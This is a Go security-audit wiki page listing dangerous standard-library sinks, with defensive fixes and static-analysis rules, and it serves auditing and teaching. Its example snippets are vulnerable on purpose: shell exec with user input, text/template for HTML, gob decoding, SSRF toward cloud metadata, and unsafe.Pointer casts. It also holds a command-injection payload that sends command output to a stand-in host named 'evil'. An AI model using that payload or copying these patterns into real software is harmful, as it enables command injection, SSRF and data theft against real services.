---
title: Go Dangerous Sinks Audit
slug: dangerous-go-sinks
---

> **TL;DR:** In Go codebases, auditors hunt for `exec.Command("sh", "-c", ...)`, `text/template` rendered into HTML, `encoding/gob` decoders fed by the network, `unsafe.Pointer` casts of foreign bytes, and `http.Get` on user-supplied URLs.

## What it is
Go is often perceived as "memory-safe so audit-light", but several stdlib APIs are dangerous when fed untrusted data. `text/template` does not escape HTML, `gob` will construct any registered concrete type from a stream, `unsafe.Pointer` will happily reinterpret attacker-shaped bytes, and `net/http` will follow redirects and resolve any hostname — including link-local metadata. These usually slip through review because the unsafe sink is one stdlib import away from the safe one.

## Preconditions / where it applies
- Go 1.20+ services using `net/http`, `os/exec`, `text/template`, `html/template`, `encoding/gob`
- Sinks appear in admin tooling, webhook fetchers, internal RPC, image/PDF render workers
- Safe-looking patterns: `exec.Command("bash", "-c", userArg)`, `template.New("x").Parse(userTmpl)`, `gob.NewDecoder(conn).Decode(&v)`

## Technique
```go
// 1. Command injection — shell interpreter with user input
cmd := exec.Command("sh", "-c", "convert "+r.FormValue("path")+" out.png")
cmd.Run() // payload: "; curl evil/$(id|base64) #"

// 2. Wrong template package → XSS / SSTI-ish output
import "text/template"
t, _ := template.New("p").Parse(r.FormValue("tmpl"))
t.Execute(w, ctx) // {{.Secret}} or raw <script> leaks unescaped

// 3. gob decode of untrusted bytes — type confusion / panic-DoS
var v interface{}
gob.NewDecoder(r.Body).Decode(&v) // attacker chooses concrete type

// 4. SSRF — no host allowlist, follows redirects to 169.254.169.254
resp, _ := http.Get(r.URL.Query().Get("url"))
io.Copy(w, resp.Body)

// 5. unsafe.Pointer reinterpret of attacker bytes
hdr := (*Header)(unsafe.Pointer(&buf[0])) // OOB read if buf too short
```

## Detection and defence
- Semgrep: `go.lang.security.audit.dangerous-exec-command`, `go.lang.security.audit.dangerous-template-execute`, `go.lang.security.audit.net.ssrf`
- CodeQL: `go/command-injection`, `go/ssrf`, `go/unsafe-unmarshal`
- gosec rules: G204 (subprocess), G203 (template), G107 (URL), G103 (unsafe), G115 (int conversion)
- Replace `text/template` with `html/template` for any HTML output; use `exec.Command(bin, args...)` with no shell; wrap `http.Client` with an allowlist `DialContext` and `CheckRedirect`
- For deserialisation prefer `encoding/json` with strict schemas; never `gob` across trust boundaries

## References
- [Go html/template docs](https://pkg.go.dev/html/template) — contextual escaping rationale
- [gosec rules](https://github.com/securego/gosec) — community static analyser
- [Go SSRF safe http.Client](https://pkg.go.dev/net/http#Client) — `Transport.DialContext` hook

See also: [[source-sink-flow-analysis]], [[ssrf-source-sink-flow]], [[dangerous-java-sinks]].
